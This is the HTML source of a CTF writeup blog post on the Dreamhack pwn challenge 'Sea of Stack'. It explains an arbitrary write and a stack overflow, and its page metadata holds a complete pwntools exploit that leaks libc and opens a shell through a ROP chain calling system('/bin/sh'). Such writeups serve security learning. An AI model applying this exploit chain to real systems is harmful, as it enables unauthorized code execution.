@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack Sea of Stack Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp&#43;0h] [rbp-30h] BYREF
+  _QWORD *v5; // [rsp&#43;8h] [rbp-28h] BYREF
+  char s1[28]; // [rsp&#43;10h] [rbp-20h] BYREF
+  int number; // [rsp&#43;2Ch] [rbp-4h]
+
+  proc_init(argc, argv, envp);
+  printf(&#34;If you really want to give me a present, bring me that kind detective&#39;s heart.\n&gt; &#34;);
+  read_input(s1, 16);
+  if ( !strcmp(s1, &#34;Decision2Solve&#34;) &amp;&amp; !gotPresent )
+  {
+    read_input(&amp;v5, 8);
+    read_input(&amp;v4, 6);
+    *v5 = v4;
+    gotPresent = 1;
+  }
+  print_menu();
+  number = read_number();
+  if ( number == 1 )
+  {
+    safe();
+  }
+  else if ( number == 2 )
+  {
+    unsafe();
+  }
+  return 0;
+}
+__int64 unsafe_func()
+{
+  _BYTE v1[32]; // [rsp&#43;0h] [rbp-20h] BYREF
+
+  return read_input(v1, 0x10000);
+}
+void *safe_func()
+{
+  _BYTE s[48]; // [rsp&#43;0h] [rbp-30h] BYREF
+
+  read_input(s, 41);
+  return memset(s, 0, 0x28u);
+}
+Identifying the vulnerabilities
+This is the memory layout in .bss:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/seaofstack-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/seaofstack-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/seaofstack-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack Sea of Stack Writeup">
+  <meta property="og:description" content="Challenge overview 플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.
+int __fastcall main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp&#43;0h] [rbp-30h] BYREF _QWORD *v5; // [rsp&#43;8h] [rbp-28h] BYREF char s1[28]; // [rsp&#43;10h] [rbp-20h] BYREF int number; // [rsp&#43;2Ch] [rbp-4h] proc_init(argc, argv, envp); printf(&#34;If you really want to give me a present, bring me that kind detective&#39;s heart.\n&gt; &#34;); read_input(s1, 16); if ( !strcmp(s1, &#34;Decision2Solve&#34;) &amp;&amp; !gotPresent ) { read_input(&amp;v5, 8); read_input(&amp;v4, 6); *v5 = v4; gotPresent = 1; } print_menu(); number = read_number(); if ( number == 1 ) { safe(); } else if ( number == 2 ) { unsafe(); } return 0; } __int64 unsafe_func() { _BYTE v1[32]; // [rsp&#43;0h] [rbp-20h] BYREF return read_input(v1, 0x10000); } void *safe_func() { _BYTE s[48]; // [rsp&#43;0h] [rbp-30h] BYREF read_input(s, 41); return memset(s, 0, 0x28u); } Identifying the vulnerabilities This is the memory layout in .bss:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-13T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack Sea of Stack Writeup">
+<meta name="twitter:description" content="Challenge overview
+플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp&#43;0h] [rbp-30h] BYREF
+  _QWORD *v5; // [rsp&#43;8h] [rbp-28h] BYREF
+  char s1[28]; // [rsp&#43;10h] [rbp-20h] BYREF
+  int number; // [rsp&#43;2Ch] [rbp-4h]
+
+  proc_init(argc, argv, envp);
+  printf(&#34;If you really want to give me a present, bring me that kind detective&#39;s heart.\n&gt; &#34;);
+  read_input(s1, 16);
+  if ( !strcmp(s1, &#34;Decision2Solve&#34;) &amp;&amp; !gotPresent )
+  {
+    read_input(&amp;v5, 8);
+    read_input(&amp;v4, 6);
+    *v5 = v4;
+    gotPresent = 1;
+  }
+  print_menu();
+  number = read_number();
+  if ( number == 1 )
+  {
+    safe();
+  }
+  else if ( number == 2 )
+  {
+    unsafe();
+  }
+  return 0;
+}
+__int64 unsafe_func()
+{
+  _BYTE v1[32]; // [rsp&#43;0h] [rbp-20h] BYREF
+
+  return read_input(v1, 0x10000);
+}
+void *safe_func()
+{
+  _BYTE s[48]; // [rsp&#43;0h] [rbp-30h] BYREF
+
+  read_input(s, 41);
+  return memset(s, 0, 0x28u);
+}
+Identifying the vulnerabilities
+This is the memory layout in .bss:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack Sea of Stack Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/seaofstack-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack Sea of Stack Writeup",
+  "name": "Dreamhack Sea of Stack Writeup",
+  "description": "Challenge overview 플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp+0h] [rbp-30h] BYREF _QWORD *v5; // [rsp+8h] [rbp-28h] BYREF char s1[28]; // [rsp+10h] [rbp-20h] BYREF int number; // [rsp+2Ch] [rbp-4h] proc_init(argc, argv, envp); printf(\u0026#34;If you really want to give me a present, bring me that kind detective\u0026#39;s heart.\\n\u0026gt; \u0026#34;); read_input(s1, 16); if ( !strcmp(s1, \u0026#34;Decision2Solve\u0026#34;) \u0026amp;\u0026amp; !gotPresent ) { read_input(\u0026amp;v5, 8); read_input(\u0026amp;v4, 6); *v5 = v4; gotPresent = 1; } print_menu(); number = read_number(); if ( number == 1 ) { safe(); } else if ( number == 2 ) { unsafe(); } return 0; } __int64 unsafe_func() { _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF return read_input(v1, 0x10000); } void *safe_func() { _BYTE s[48]; // [rsp+0h] [rbp-30h] BYREF read_input(s, 41); return memset(s, 0, 0x28u); } Identifying the vulnerabilities This is the memory layout in .bss:\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp+0h] [rbp-30h] BYREF _QWORD *v5; // [rsp+8h] [rbp-28h] BYREF char s1[28]; // [rsp+10h] [rbp-20h] BYREF int number; // [rsp+2Ch] [rbp-4h] proc_init(argc, argv, envp); printf(\"If you really want to give me a present, bring me that kind detective's heart.\\n\u003e \"); read_input(s1, 16); if ( !strcmp(s1, \"Decision2Solve\") \u0026\u0026 !gotPresent ) { read_input(\u0026v5, 8); read_input(\u0026v4, 6); *v5 = v4; gotPresent = 1; } print_menu(); number = read_number(); if ( number == 1 ) { safe(); } else if ( number == 2 ) { unsafe(); } return 0; } __int64 unsafe_func() { _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF return read_input(v1, 0x10000); } void *safe_func() { _BYTE s[48]; // [rsp+0h] [rbp-30h] BYREF read_input(s, 41); return memset(s, 0, 0x28u); } Identifying the vulnerabilities This is the memory layout in .bss:\n.data:0000000000404010 ; __int64 (__fastcall *safe)() .data:0000000000404010 safe dq offset safe_func ; DATA XREF: main+AF↑r .data:0000000000404018 public unsafe .data:0000000000404018 ; __int64 (__fastcall *unsafe)() .data:0000000000404018 unsafe dq offset unsafe_func ; DATA XREF: main+C5↑r First thing, we get an arbitrary write. I’m assuming we have to overwrite one of these functions with something else.\nThe problem with the unsafe_func overflow is that after a specific amount of bytes, we start writing into forbidden memory space, way beyond the stack, and we get a cannot dereference error.\nI had to cheat for this one…\nApparently, the way to do this was to overwrite safe_func with main, and call it a thousand times. That would decrease the rbp and rsp values enough that adding 0x10000 to rbp wouldn’t escape anywhere we aren’t allowed to write.\nHere is before calling main a gazillion times:\n*RBP 0x7fff3b8a0170 —▸ 0x7fff3b8a0288 —▸ 0x7fff3b8a0ef4 ◂— '/home/kali/Downloads/dreamhack/seaofstack/deploy/prob' *RSP 0x7fff3b8a0140 —▸ 0x401446 (main) ◂— endbr64 Here is after:\nRBP 0x7fff3b890730 —▸ 0x7fff3b890770 —▸ 0x7fff3b8907b0 —▸ 0x7fff3b8907f0 —▸ 0x7fff3b890830 ◂— ... *RSP 0x7fff3b8906b0 ◂— 0xe This happens because of the way the stack behaves. In the beginning of main:\n; __unwind { endbr64 push rbp mov rbp, rsp sub rsp, 30h Every time the main stack is initialized, its rbp takes the old one’s rsp. That’s why it kept moving backwards.\nAnyways, actually running this exploit takes 16 minutes because of this, since we’re doing it remotely to Koreea.\nAnd, after the first ROP chain, we need to redirect back to unsafe_func, not main, since we messed everything up royally.\nAfter we bypass the crash condition, we can go ahead and build a ROP chain as usual. Since it’s taking so long, I didn’t want to test one gadgets, and I didn’t want to install the required libc version either, to run this properly to try them on my machine first.\nSo I went ahead and wrote it using system and \"/bin/sh\".\nThis took me even longer before I figured it out! After two hours of testing, I raised the number of main repeats to 0x400.\nFinally, after a very long time, the flag:\nThe Exploit from pwn import * import time elf = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/prob') libc = ELF('/home/kali/Downloads/dreamhack/seaofstack/deploy/libc.so.6') #libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') context.arch = 'amd64' cyberedu = 'host8.dreamhack.games:21304' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() #gdb.attach(p) puts_got = elf.got[b'puts'] puts_plt = elf.plt[b'puts'] main = 0x401446 unsafe = 0x401426 addr1 = p64(0x404010) val = p32(main) p.recvuntil(b\"\u003e \") p.sendline(b\"Decision2Solve\\x00\") sleep(1) #must be 8 len p.send(addr1) #must be 6 len p.send(val + b'\\x00' * 2) #safe -\u003e return to main #do this a thousand times i guess print('sup') for i in range(0, 0x400): p.recvuntil(b\"\u003e \") p.sendline(b\"1\") p.recvuntil(b\"\u003e \") p.send(b\"A\"*16) print(f\"i is {i}\") #have 0x10000 bytes into v1 #40129b: pop rdi; nop; pop rbp; ret; p.recvuntil(b\"\u003e \") p.sendline(b\"2\") pop_rdi_nop_pop_rbp_ret = 0x40129b payload = ( b\"A\" * 32 + b\"B\" * 8 + p64(pop_rdi_nop_pop_rbp_ret) + p64(puts_got) + b\"B\"* 8 + p64(puts_plt) + p64(unsafe) ) payload = payload.ljust(0x10000, b\"\\x90\") p.send(payload) data = p.recvline().strip() val = u64(data.ljust(8, b\"\\x00\")) libc.address = val - libc.sym[b'puts'] print(hex(libc.address)) #takes too long to bother checking one gadgets #ret back to unsafe_func not main bc we fucked the registers system = libc.sym['system'] binsh = next(libc.search(b\"/bin/sh\")) ret = 0x40101a payload = ( b\"A\" * 32 + b\"B\" * 8 + p64(pop_rdi_nop_pop_rbp_ret) + p64(binsh) + b\"C\"*8 + p64(ret) + p64(system) ) payload = payload.ljust(0x10000, b\"\\x90\") p.send(payload) p.interactive() As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "731",
+  "inLanguage": "en",
+  "datePublished": "2026-05-13T00:00:00Z",
+  "dateModified": "2026-05-13T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/seaofstack-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack Sea of Stack Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-13 00:00:00 +0000 UTC'>May 13, 2026</span>&nbsp;·&nbsp;<span>4 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The Exploit">The Exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>플래그는 바다에 버려요. 깊은 데 빠뜨려서, 아무도 못 찾게 해요.</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _QWORD <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// [rsp+8h] [rbp-28h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s1[<span style="color:#ae81ff">28</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> number; <span style="color:#75715e">// [rsp+2Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">proc_init</span>(argc, argv, envp);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;If you really want to give me a present, bring me that kind detective&#39;s heart.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_input</span>(s1, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(s1, <span style="color:#e6db74">&#34;Decision2Solve&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>gotPresent )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_input</span>(<span style="color:#f92672">&amp;</span>v5, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_input</span>(<span style="color:#f92672">&amp;</span>v4, <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>v5 <span style="color:#f92672">=</span> v4;
+</span></span><span style="display:flex;"><span>    gotPresent <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_menu</span>();
+</span></span><span style="display:flex;"><span>  number <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_number</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( number <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">safe</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( number <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsafe</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">unsafe_func</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _BYTE v1[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">read_input</span>(v1, <span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">safe_func</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _BYTE s[<span style="color:#ae81ff">48</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_input</span>(s, <span style="color:#ae81ff">41</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>This is the memory layout in .bss:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>.data:<span style="color:#960050;background-color:#1e0010">0000000000404010</span> <span style="color:#75715e">; __int64 (__fastcall *safe)()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.data:<span style="color:#960050;background-color:#1e0010">0000000000404010</span> <span style="color:#a6e22e">safe</span>            <span style="color:#66d9ef">dq</span> <span style="color:#66d9ef">offset</span> <span style="color:#66d9ef">safe_func</span>     <span style="color:#75715e">; DATA XREF: main+AF↑r
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.data:<span style="color:#960050;background-color:#1e0010">0000000000404018</span>                 <span style="color:#a6e22e">public</span> <span style="color:#66d9ef">unsafe</span>
+</span></span><span style="display:flex;"><span>.data:<span style="color:#960050;background-color:#1e0010">0000000000404018</span> <span style="color:#75715e">; __int64 (__fastcall *unsafe)()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.data:<span style="color:#960050;background-color:#1e0010">0000000000404018</span> <span style="color:#a6e22e">unsafe</span>          <span style="color:#66d9ef">dq</span> <span style="color:#66d9ef">offset</span> <span style="color:#66d9ef">unsafe_func</span>   <span style="color:#75715e">; DATA XREF: main+C5↑r
+</span></span></span></code></pre></div><p>First thing, we get an arbitrary write. I&rsquo;m assuming we have to overwrite one of these functions with something else.</p>
+<p>The problem with the <code>unsafe_func</code> overflow is that after a specific amount of bytes, we start writing into forbidden memory space, way beyond the stack, and we get a <em>cannot dereference</em> error.</p>
+<hr>
+<p>I had to cheat for this one&hellip;</p>
+<p>Apparently, the way to do this was to overwrite <code>safe_func</code> with main, and call it a thousand times. That would decrease the <code>rbp</code> and <code>rsp</code> values enough that adding <code>0x10000</code> to <code>rbp</code> wouldn&rsquo;t escape anywhere we aren&rsquo;t allowed to write.</p>
+<p>Here is before calling <code>main</code> a gazillion times:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*RBP  0x7fff3b8a0170 —▸ 0x7fff3b8a0288 —▸ 0x7fff3b8a0ef4 ◂— <span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/seaofstack/deploy/prob&#39;</span>
+</span></span><span style="display:flex;"><span>*RSP  0x7fff3b8a0140 —▸ 0x401446 <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> ◂— endbr64
+</span></span></code></pre></div><p>Here is after:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>RBP  0x7fff3b890730 —▸ 0x7fff3b890770 —▸ 0x7fff3b8907b0 —▸ 0x7fff3b8907f0 —▸ 0x7fff3b890830 ◂— ...
+</span></span><span style="display:flex;"><span>*RSP  0x7fff3b8906b0 ◂— 0xe
+</span></span></code></pre></div><p>This happens because of the way the stack behaves. In the beginning of <code>main</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; __unwind {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">endbr64</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">30</span><span style="color:#66d9ef">h</span>
+</span></span></code></pre></div><p>Every time the main stack is initialized, its <code>rbp</code> takes the old one&rsquo;s <code>rsp</code>. That&rsquo;s why it kept moving backwards.</p>
+<p>Anyways, actually running this exploit takes 16 minutes because of this, since we&rsquo;re doing it remotely to Koreea.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/seaofstack-writeup/lol.png#center"></p>
+<hr>
+<p>And, after the first ROP chain, we need to redirect back to <code>unsafe_func</code>, not main, since we messed everything up royally.</p>
+<p>After we bypass the crash condition, we can go ahead and build a ROP chain as usual. Since it&rsquo;s taking so long, I didn&rsquo;t want to test one gadgets, and I didn&rsquo;t want to install the required libc version either, to run this properly to try them on my machine first.</p>
+<p>So I went ahead and wrote it using <code>system</code> and <em>&quot;/bin/sh&quot;</em>.</p>
+<p>This took me even longer before I figured it out! After two hours of testing, I raised the number of main repeats to <code>0x400</code>.</p>
+<p>Finally, after a very long time, the flag:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/seaofstack-writeup/flag.png#center"></p>
+<hr>
+<h2 id="the-exploit">The Exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/seaofstack/deploy/prob&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/seaofstack/deploy/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = ELF(&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
